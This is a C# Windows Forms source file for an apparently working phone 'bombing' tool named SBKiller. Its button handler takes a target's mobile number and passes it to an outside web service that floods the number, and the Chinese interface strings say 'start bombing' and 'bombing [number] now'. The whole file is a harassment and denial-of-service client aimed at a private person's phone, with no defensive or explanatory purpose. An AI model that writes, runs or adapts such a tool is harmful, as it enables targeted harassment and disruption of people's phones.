using System;
using System.Text;
using System.Windows.Forms;

namespace SBKiller
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void button3_Click(object sender, EventArgs e)
        {
            string phone = textBox3.Text;
            bool isNumber = IsNumber(phone);
            if (button3.Text == @"开始轰炸")
            {
                if (isNumber == false && phone.Length != 11 )
                {
                    MessageBox.Show(@"W请输入正确的手机号！", @"提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    webBrowser1.Navigate(string.Format("http://hz.o3f.cc/index.php?hm={0}&ok=",phone));
                    button3.Text = @"停止轰炸";
                    textBox3.ReadOnly = true;
                    MessageBox.Show(@"正在对" + phone + @"进行轰炸！", @"提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            else
            {
                webBrowser1.Navigate("");
                textBox3.ReadOnly = false;
                button3.Text = @"开始轰炸";
            }
        }
        public static bool IsNumber(string str)
        {
            if (str == null || str.Length == 0)
                return false;
            ASCIIEncoding ascii = new ASCIIEncoding();
            byte[] bytestr = ascii.GetBytes(str);

            foreach (byte c in bytestr)
            {
                if (c < 48 || c > 57)
                {
                    return false;
                }
            }
            return true;
        }

        private void textBox3_KeyDown_1(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                button3_Click(sender, e);
            }
        }
    }
}
